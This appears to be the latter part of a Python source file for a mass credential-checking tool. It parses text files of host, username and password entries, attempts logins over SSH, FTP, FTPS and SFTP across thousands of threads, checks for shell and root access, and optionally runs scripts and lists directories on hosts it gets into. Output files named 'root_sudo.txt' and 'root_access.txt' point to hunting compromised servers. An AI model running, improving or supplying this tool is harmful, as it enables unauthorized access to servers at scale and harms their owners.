    entries_with_lines = []

    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for raw_line in f:
                line = raw_line.strip()
                if not line:
                    continue

                # Check for any protocol:// prefix (ssh://, ftp://, etc - case insensitive)
                if re.match(r"^(ssh|ftp|ftps|sftp)://", line, re.IGNORECASE):
                    protocol_type, host_info = parse_connection_string(line)
                    if protocol_type and host_info:
                        uid = f"{host_info['host']}|{host_info['port']}|{host_info['username']}|{host_info['password']}"
                        entries_with_lines.append(
                            {
                                "id": uid,
                                "host": host_info["host"],
                                "port": host_info["port"],
                                "username": host_info["username"],
                                "password": host_info["password"],
                                "orig_lines": [raw_line.rstrip("\n")],
                                "processed": False,
                            }
                        )
                elif line.startswith("Host:"):
                    host_line_raw = raw_line
                    username_line_raw = next(f, "")
                    password_line_raw = next(f, "")
                    host_line = host_line_raw.strip()
                    username_line = username_line_raw.strip()
                    password_line = password_line_raw.strip()

                    host_type, host_info = parse_connection_string(host_line)
                    username_type, username_info = parse_connection_string(
                        username_line
                    )
                    password_type, password_info = parse_connection_string(
                        password_line
                    )

                    if (
                        host_type == "HOST_LINE"
                        and username_type == "USERNAME_LINE"
                        and password_type == "PASSWORD_LINE"
                    ):
                        uid = f"{host_info['host']}|{host_info['port']}|{username_info['username']}|{password_info['password']}"
                        entries_with_lines.append(
                            {
                                "id": uid,
                                "host": host_info["host"],
                                "port": host_info["port"],
                                "username": username_info["username"],
                                "password": password_info["password"],
                                "orig_lines": [
                                    host_line_raw.rstrip("\n"),
                                    username_line_raw.rstrip("\n"),
                                    password_line_raw.rstrip("\n"),
                                ],
                                "processed": False,
                            }
                        )
                else:
                    match = re.match(
                        r"^([^:\s]+)(?::(\d+))?\s+([^\s]+)\s+([^\s]+)$", line
                    )
                    if match:
                        host = match.group(1)
                        port_str = match.group(2)
                        username = match.group(3)
                        password = match.group(4)
                        port = int(port_str) if port_str else 22
                        uid = f"{host}|{port}|{username}|{password}"
                        entries_with_lines.append(
                            {
                                "id": uid,
                                "host": host,
                                "port": port,
                                "username": username,
                                "password": password,
                                "orig_lines": [raw_line.rstrip("\n")],
                                "processed": False,
                            }
                        )

    except FileNotFoundError:
        if args.debug_log:
            script_logger.critical(f"Input file not found: {filepath}")
        safe_print(f"[bold red]❌ Input file not found: {filename}[/bold red]")
        return
    except Exception as e:
        if args.debug_log:
            script_logger.critical(
                f"Error reading input file {filepath} for parsing: {e}"
            )
        safe_print(f"[bold red]❌ Error reading file {filename}: {e}[/bold red]")
        return

    FILE_ENTRIES[filepath] = entries_with_lines
    FILE_COMPLETED.setdefault(filepath, {})
    FILE_COMPLETED_COUNTER.setdefault(filepath, 0)

    TOTAL_LINES = len(entries_with_lines) * len(current_protocols)

    if TOTAL_LINES == 0:
        if args.debug_log:
            script_logger.warning(
                f"No valid host entries found in '{filepath}'. Skipping."
            )
        safe_print(
            f"[bold yellow]⚠️ No valid host entries found in '{filename}'. Skipping.[/bold yellow]"
        )
        FILE_ENTRIES.pop(filepath, None)
        return

    if args.debug_log:
        script_logger.info(
            f"Found {len(entries_with_lines)} valid entries in {filename}"
        )

    stats = MultiProtocolFancyStats(
        total_hosts=len(entries_with_lines),
        filename=filename,
        protocols=current_protocols,
        threads=max_threads,
        total_hosts_all_files=total_hosts_all_files,
        total_checked_all_files=total_checked_all_files,
    )
    stats.start()
    time.sleep(0.5)

    # MEMORY OPTIMIZATION: Submit futures in batches instead of all at once.
    # Submitting millions of futures at once fills RAM with Future objects.
    # Process FUTURE_BATCH_SIZE tasks at a time, then free them before continuing.
    FUTURE_BATCH_SIZE = 2000
    gc_task_counter = 0

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            update_stats_safely("set_threads", message=str(max_threads))
            update_stats_safely(
                "add_output",
                message=f"⚡ Ultra-fast scan started ({max_threads} threads)",
            )

            batch_futures = []

            for entry in entries_with_lines:
                for proto in current_protocols:
                    port = entry.get("port", 22)
                    if not isinstance(port, int):
                        try:
                            port = int(port)
                        except (ValueError, TypeError):
                            port = 22

                    future = submit_protocol_task(
                        executor,
                        proto,
                        entry["host"],
                        port,
                        entry["username"],
                        entry["password"],
                        CONNECT_TIMEOUT,
                        filepath,
                    )
                    if future:
                        batch_futures.append(future)

                # MEMORY OPTIMIZATION: Drain and free batch when full
                if len(batch_futures) >= FUTURE_BATCH_SIZE:
                    for future in concurrent.futures.as_completed(batch_futures):
                        try:
                            future.result()
                        except Exception as exc:
                            if args.debug_log:
                                script_logger.error(
                                    f"A task generated an exception: {exc}",
                                    exc_info=True,
                                )
                        if stats and total_hosts_all_files:
                            stats.update_total_checked_all_files(
                                total_checked_all_files + stats.total_hosts_checked
                            )

                    batch_futures.clear()
                    gc_task_counter += FUTURE_BATCH_SIZE
                    if gc_task_counter >= GC_COLLECT_INTERVAL * len(current_protocols):
                        gc.collect()
                        gc_task_counter = 0

                if SHUTDOWN_REQUESTED:
                    break

            # Drain remaining futures
            update_stats_safely(
                "add_output",
                message=f"⏳ {len(batch_futures)} remaining tasks, finishing...",
            )
            for future in concurrent.futures.as_completed(batch_futures):
                try:
                    future.result()
                except Exception as exc:
                    if args.debug_log:
                        script_logger.error(
                            f"A task generated an exception: {exc}", exc_info=True
                        )
                if stats and total_hosts_all_files:
                    stats.update_total_checked_all_files(
                        total_checked_all_files + stats.total_hosts_checked
                    )

            batch_futures.clear()
            update_stats_safely("set_threads", message="0")

    except KeyboardInterrupt:
        if args.debug_log:
            script_logger.info(f"Scan of {filename} interrupted by user.")
        update_stats_safely("add_output", message="🛑 Scan interrupted by user")
    except Exception as e:
        if args.debug_log:
            script_logger.error(
                f"Unexpected error during processing of {filename}: {e}", exc_info=True
            )
    finally:
        # Flush remaining buffers
        flush_write_buffers()

        update_stats_safely("set_threads", message="0")
        update_stats_safely("add_output", message=f"🎉 Scan of {filename} completed!")
        time.sleep(3)
        if stats:
            stats.stop()

        destination_path = os.path.join(CHECKED_DIR, filename)
        try:
            shutil.move(filepath, destination_path)
            if args.debug_log:
                script_logger.info(
                    f"Moved processed file '{filepath}' to '{destination_path}'"
                )
            safe_print(
                f"[bold green]✓ Moved processed file: [white]{filename}[/white] to [blue]{CHECKED_DIR}[/blue][/bold green]"
            )
        except Exception as e:
            if args.debug_log:
                script_logger.error(
                    f"Error moving file {filepath} to {destination_path}: {e}"
                )
            safe_print(f"[bold red]❌ Error moving file {filename}: {e}[/bold red]")

        with PROCESSED_LOCK:
            FILE_ENTRIES.pop(filepath, None)
            FILE_COMPLETED.pop(filepath, None)
            FILE_COMPLETED_COUNTER.pop(filepath, None)

        # MEMORY OPTIMIZATION: Force aggressive garbage collection after each file
        gc.collect()
        gc.collect()  # Double collect to ensure cleanup

        # Optional: Log memory usage if debug enabled
        if args.debug_log:
            try:
                import os as os_module

                pid = os_module.getpid()
                import subprocess

                try:
                    result = subprocess.check_output(["ps", "aux"], text=True)
                    for line in result.split("\n"):
                        if str(pid) in line:
                            parts = line.split()
                            if len(parts) > 5:
                                rss_mb = int(parts[5]) / 1024
                                script_logger.debug(
                                    f"Memory usage after {os.path.basename(filepath)}: ~{rss_mb:.1f} MB"
                                )
                            break
                except:
                    pass
            except:
                pass

        time.sleep(0.1)  # Brief pause to allow OS memory reclamation


def should_skip_file(filename):
    """Check if a file should be skipped."""
    basename = os.path.basename(filename)

    if basename in EXCLUDED_FILES:
        return True

    if os.path.dirname(filename) == CHECKED_DIR or (
        os.path.abspath(os.path.dirname(filename)) == os.path.abspath(CHECKED_DIR)
    ):
        return True

    if basename.startswith("checked_") and basename.endswith(".txt"):
        return True

    return False


def get_input_files(directory):
    """Gets a list of .txt files to process from the specified directory."""
    files_to_process = []
    try:
        for filename in os.listdir(directory):
            full_path = os.path.join(directory, filename)
            if (
                os.path.isfile(full_path)
                and filename.endswith(".txt")
                and not should_skip_file(full_path)
            ):
                files_to_process.append(full_path)
        files_to_process.sort()
    except FileNotFoundError:
        if args.debug_log:
            script_logger.critical(f"Input directory not found: {directory}")
        safe_print(f"[bold red]❌ Input directory not found: {directory}[/bold red]")
        sys.exit(1)
    except Exception as e:
        if args.debug_log:
            script_logger.error(
                f"Error listing directory {directory}: {e}", exc_info=True
            )
        safe_print(
            f"[bold red]❌ Error accessing directory: {directory} - {e}[/bold red]"
        )
        sys.exit(1)
    return files_to_process


EXCLUDED_FILES = {
    "output.txt",
    "debug.log",
    "root_sudo.txt",
    "root_access.txt",
    "checked_ssh.txt",
    "checked_ftp.txt",
    "checked_ftps.txt",
    "checked_sftp.txt",
    "checked_ftp_dirs.txt",
    "checked_ssh_dirs.txt",
    "checked_ftps_dirs.txt",
    "checked_sftp_dirs.txt",
    "requirements.txt",
}

if __name__ == "__main__":
    # Clean up any leftover temporary files from previous runs
    cleanup_temp_files()

    # Display version information
    safe_print(
        f"\n[bold yellow]╔═══════════════════════════════════════════════════════════════╗[/bold yellow]"
    )
    safe_print(f"[bold red]║  🔴 VERSION: {SCRIPT_VERSION:<49} 🔴  ║[/bold red]")
    safe_print(
        f"[bold yellow]╚═══════════════════════════════════════════════════════════════╝[/bold yellow]"
    )
    for feature in SCRIPT_FEATURES:
        safe_print(f"[green]{feature}[/green]")
    safe_print(
        f"[bold yellow]═══════════════════════════════════════════════════════════════[/bold yellow]\n"
    )

    if args.debug_log:
        script_logger.info(
            f"[v{SCRIPT_VERSION}] Starting ultra-fast scanner with protocols: {', '.join(protocols)} and {args.threads} threads."
        )

    # Print optimization settings
    safe_print("\n[bold cyan]⚡ ULTRA-FAST MODE ACTIVATED ⚡[/bold cyan]")
    safe_print("[cyan]├─ Quick port check: ENABLED (0.5s timeout)[/cyan]")
    safe_print(
        f"[cyan]├─ Directory listings: {'DISABLED' if args.skip_dir_listing else 'ENABLED'}[/cyan]"
    )
    safe_print(
        f"[cyan]├─ Script execution: {'DISABLED' if args.skip_script_exec else 'ENABLED'}[/cyan]"
    )
    safe_print(
        f"[cyan]├─ File cleanup: {'DISABLED ⚡ (NO I/O BLOCKING!)' if args.skip_cleanup else f'ENABLED (threshold: {CLEANUP_THRESHOLD})'}[/cyan]"
    )
    safe_print(f"[cyan]├─ Connection timeout: {CONNECT_TIMEOUT}s[/cyan]")
    safe_print(f"[cyan]├─ Auth timeout: {AUTH_TIMEOUT}s[/cyan]")
    safe_print(f"[cyan]├─ Shell verify timeout: {SHELL_VERIFY_TIMEOUT}s[/cyan]")
    safe_print(f"[cyan]├─ Command timeout: {COMMAND_TIMEOUT}s[/cyan]")
    safe_print(f"[cyan]└─ Thread count: {args.threads}[/cyan]\n")

    if args.file:
        filepath = args.file
        if not os.path.exists(filepath):
            safe_print(f"[bold red]❌ Specified file not found: {filepath}[/bold red]")
            sys.exit(1)
        if not filepath.endswith(".txt"):
            safe_print(
                f"[bold red]❌ Specified file must be a .txt file: {filepath}[/bold red]"
            )
            sys.exit(1)

        safe_print(
            f"[bold green]Processing single file: {os.path.basename(filepath)}[/bold green]\n"
        )

        safe_print(f"[bold cyan]📊 Counting hosts in file...[/bold cyan]")

        # Auto-clean credentials file if it has issues
        filepath = auto_clean_credentials_file(filepath)

        total_hosts_single = count_entries_in_file(filepath)
        safe_print(f"[bold green]✓ Found {total_hosts_single:,} entries[/bold green]\n")

        try:
            process_single_file(
                filepath, protocols, args.threads, total_hosts_single, 0
            )
        except KeyboardInterrupt:
            safe_print(
                "\n[bold red]Scan forcefully interrupted by user. Exiting.[/bold red]"
            )
        except Exception as e:
            if args.debug_log:
                script_logger.critical(
                    f"Critical error during processing of {filepath}: {e}",
                    exc_info=True,
                )
            safe_print(
                f"[bold red]A critical error occurred while processing {os.path.basename(filepath)}.[/bold red]"
            )
        finally:
            flush_write_buffers()

        safe_print(
            f"\n[bold green]✅ Processing of {os.path.basename(filepath)} completed.[/bold green]"
        )

    elif args.directory:
        if args.debug_log:
            script_logger.info(f"Scanning directory: {args.directory}")

        input_files_list = get_input_files(args.directory)

        if not input_files_list:
            safe_print(
                f"[bold red]❌ No scannable .txt files found in: {args.directory}.[/bold red]"
            )
            sys.exit(0)

        safe_print(
            f"[bold green]Found {len(input_files_list)} file(s) to process[/bold green]"
        )
        safe_print(
            f"[bold cyan]📊 Processing files sequentially (no pre-scan)...[/bold cyan]"
        )

        # MEMORY OPTIMIZATION: Count files individually without pre-loading
        # This avoids the 9GB memory spike from loading all files at startup
        total_hosts_all = 0
        total_checked_so_far = 0
        for filepath in input_files_list:
            try:
                # Auto-clean credentials file if it has issues
                filepath = auto_clean_credentials_file(filepath)

                # MEMORY OPTIMIZATION: Count this file only, then process it immediately
                # This streams the count without buffering the entire file
                try:
                    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                        file_entry_count = sum(1 for _ in f)
                except Exception as e:
                    if args.debug_log:
                        script_logger.warning(f"Could not count {filepath}: {e}")
                    file_entry_count = 0

                total_hosts_all += file_entry_count

                process_single_file(
                    filepath,
                    protocols,
                    args.threads,
                    total_hosts_all,
                    total_checked_so_far,
                )
                if stats:
                    total_checked_so_far += stats.total_hosts_checked
            except KeyboardInterrupt:
                safe_print(
                    "\n[bold red]Scan forcefully interrupted by user. Exiting.[/bold red]"
                )
                break
            except Exception as e:
                if args.debug_log:
                    script_logger.critical(
                        f"Critical error during processing of {filepath}: {e}",
                        exc_info=True,
                    )

        flush_write_buffers()
        safe_print(
            "\n[bold green]✅ All discovered files have been processed.[/bold green]"
        )

    # DEDUPLICATION: Remove duplicate entries from output files
    safe_print("\n[yellow]🧹 Deduplicating output files...[/yellow]")
    deduplicate_output_files()

    # FINAL CHECK: Move empty input files to \!checked directory
    safe_print("\n[yellow]🧹 Checking for completed input files...[/yellow]")
    for input_file in (args.path, ) if args.path and os.path.isfile(args.path) else []:
        if input_file and os.path.exists(input_file):
            file_size = os.path.getsize(input_file)
            if file_size == 0:
                # File is empty - all hosts were checked
                try:
                    checked_dir = os.path.join(os.path.dirname(input_file), "!checked")
                    os.makedirs(checked_dir, exist_ok=True)

                    file_basename = os.path.basename(input_file)
                    checked_filepath = os.path.join(checked_dir, file_basename)

                    if os.path.exists(checked_filepath):
                        name, ext = os.path.splitext(file_basename)
                        checked_filepath = os.path.join(checked_dir, f"{name}_completed_{int(time.time())}{ext}")

                    shutil.move(input_file, checked_filepath)
                    safe_print(f"[bold green]✅ All hosts scanned! Moved to: !checked\\{os.path.basename(checked_filepath)}[/bold green]")
                except Exception as e:
                    if args.debug_log:
                        script_logger.warning(f"Could not move {input_file} to !checked: {e}")

    # CLEANUP: Remove temporary cleaned credential files
    cleanup_temp_files()

    # OPTIMIZATION: Print rate limiter info (no pool/cache in use)
    safe_print("\n[cyan]═══ SECURITY & OPTIMIZATION ═══[/cyan]")
    safe_print(
        f"[cyan]├─ Rate Limiter: max {login_rate_limiter.max_per_second}/sec[/cyan]"
    )
    safe_print(f"[cyan]├─ SSH: All connections closed after use[/cyan]")
    safe_print(f"[cyan]└─ FTP/FTPS: All connections closed after use[/cyan]")

    sys.exit(0)
